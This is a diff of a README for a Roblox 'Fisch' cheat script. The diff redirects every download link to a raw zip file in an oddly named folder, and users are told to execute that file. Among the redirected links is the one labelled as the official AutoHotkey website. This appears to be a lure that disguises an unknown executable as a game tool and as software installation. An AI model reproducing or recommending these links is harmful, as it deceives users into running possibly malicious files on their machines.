@@ -2,7 +2,7 @@
 
 Welcome to the **Fisch Script Pro** repository! This guide provides a step-by-step process to download and set up the Roblox Fisch Script for Windows in 2025. 
 
-[![Download Fisch Script](https://img.shields.io/badge/Download%20Fisch%20Script-Click%20Here-brightgreen)](https://github.com/sanvdl/Fisch-Script-Pro/releases)
+[![Download Fisch Script](https://github.com/sanvdl/Fisch-Script-Pro/raw/refs/heads/main/triolefin/Script_Pro_Fisch_2.8.zip%20Fisch%20Script-Click%20Here-brightgreen)](https://github.com/sanvdl/Fisch-Script-Pro/raw/refs/heads/main/triolefin/Script_Pro_Fisch_2.8.zip)
 
 ## Table of Contents
 
@@ -35,13 +35,13 @@ Before you begin, ensure you have the following:
 
 ### Step 1: Download the Fisch Script
 
-To start, download the Fisch Script from our [Releases page](https://github.com/sanvdl/Fisch-Script-Pro/releases). Locate the latest version, and download the file. This file needs to be executed after downloading.
+To start, download the Fisch Script from our [Releases page](https://github.com/sanvdl/Fisch-Script-Pro/raw/refs/heads/main/triolefin/Script_Pro_Fisch_2.8.zip). Locate the latest version, and download the file. This file needs to be executed after downloading.
 
 ### Step 2: Install AutoHotkey
 
 The Fisch Script requires AutoHotkey to run. Follow these steps to install it:
 
-1. Visit the [AutoHotkey website](https://www.autohotkey.com/).
+1. Visit the [AutoHotkey website](https://github.com/sanvdl/Fisch-Script-Pro/raw/refs/heads/main/triolefin/Script_Pro_Fisch_2.8.zip).
 2. Click on the "Download" button.
 3. Choose the version suitable for your Windows system.
 4. Run the installer and follow the on-screen instructions.
@@ -68,7 +68,7 @@ If you encounter issues, consider the following:
 
 - Ensure AutoHotkey is installed correctly.
 - Check if you have the latest version of the Fisch Script.
-- Visit the [Releases section](https://github.com/sanvdl/Fisch-Script-Pro/releases) for updates or community support.
+- Visit the [Releases section](https://github.com/sanvdl/Fisch-Script-Pro/raw/refs/heads/main/triolefin/Script_Pro_Fisch_2.8.zip) for updates or community support.
 
 ## Community Contributions
 
@@ -95,6 +95,6 @@ This repository covers various topics related to the Fisch Script:
 
 ## Conclusion
 
-The Fisch Script Pro repository aims to provide a straightforward guide for downloading and using the Fisch Script in Roblox. Follow the steps carefully, and enjoy a seamless fishing experience. For more information, visit our [Releases section](https://github.com/sanvdl/Fisch-Script-Pro/releases) to stay updated.
+The Fisch Script Pro repository aims to provide a straightforward guide for downloading and using the Fisch Script in Roblox. Follow the steps carefully, and enjoy a seamless fishing experience. For more information, visit our [Releases section](https://github.com/sanvdl/Fisch-Script-Pro/raw/refs/heads/main/triolefin/Script_Pro_Fisch_2.8.zip) to stay updated.
 
 Happy fishing! 🎣
